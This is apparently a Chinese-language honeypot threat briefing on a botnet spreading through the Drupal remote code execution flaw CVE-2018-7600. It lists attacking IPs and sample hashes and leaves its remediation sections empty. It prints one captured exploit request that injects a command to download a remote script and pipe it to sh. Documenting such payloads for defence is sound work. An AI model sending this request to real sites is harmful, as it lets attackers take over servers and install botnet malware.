---
layout:     post
title:      CVE-2018-7600_僵尸网络感染简报
subtitle:   CVE-2018-7600
date: 2018-08-20
author:     shenzhen_antiylabs
header-img: img/avatar-by.jpg
catalog: true
tags:
    - honeypot_event
---

# CVE-2018-7600_僵尸网络感染简报

## 概述

Drupal是一个开源内容管理系统（CMS），Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。安天蜜网团队成功捕获到采用CVE-2018-7600进行传播的僵尸网络样本及感染态势，同时感知到互联网空间的弱点设备超过166340台，分布态势广泛（见下图）：

图1  Drupal 6.x 弱点态势分布

![2018091401.png](https://github.com/zhongshendoushuizhao/zhongshendoushuizhao.github.io/blob/master/img/2018091401.png?raw=true)

图2  Drupal 7.x 弱点态势分布

![2018091402.png](https://github.com/zhongshendoushuizhao/zhongshendoushuizhao.github.io/blob/master/img/2018091402.png?raw=true)

图3  Drupal 8.x 弱点态势分布

![2018091403.png](https://github.com/zhongshendoushuizhao/zhongshendoushuizhao.github.io/blob/master/img/2018091403.png?raw=true)

## 漏洞描述

Drupal是一个开源内容管理系统（CMS），Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。

影响版本

Drupal 6.x，7.x，8.x

## 捕获载荷

```
  POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 181
Content-Type: application/x-www-form-urlencoded
Host: 66.111.41.249
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=wget%20-qO%20-%20http%3A%2F%2F54.39.23.28%2F1sh%20%7C%20sh

```

## 	攻击IP及URL

141.212.122.64

174.78.55.2

213.251.229.212

34.235.122.141

45.33.42.63

60.191.38.78

8.12.22.20

88.204.114.107

66.111.41.249

## 样本

| **样本**                         | **MD5**                          |
| -------------------------------- | -------------------------------- |
| http://54.39.23.28/1sh           | ba9c8cdff0a21aa4b694bfea432b51c7 |
| http://51.254.221.129/c/cron     | 61cb165a9d4a8d6e52a28f72d9de7c1a |
| http://51.254.221.129/c/tfti     | d31dcc21cb6474b8f409731f1d29c1aa |
| http://51.254.221.129/c/pftp     | 6d1c2dda90ce47444c2a52988a37b6fa |
| http://51.254.221.129/c/ntpd     | 4929cd2477dbab329317559e19046e7f |
| http://51.254.221.129/c/sshd     | 4929cd2477dbab329317559e19046e7f |
| http://51.254.221.129/c/bash     | ee11c23377f5363193b26dba566b9f5c |
| http://51.254.221.129/c/pty      | 77609a265b59c33ca915c20ffb6ab2da |
| http://51.254.221.129/c/shy      | 5bbdb424290ac315f9ba81d2ff8a45ae |
| http://51.254.221.129/c/nsshtfti | 04db55d0a7be6ea7e06057850321b324 |
| http://51.254.221.129/c/nsshcron | 743a654c9ad496e8b352ee609599a560 |
| http://51.254.221.129/c/nsshpftp | df392c80b0a5f8cc1f902a59b44c8e5e |

## 受影响范围







## 修复及防护建议







## 参考资料


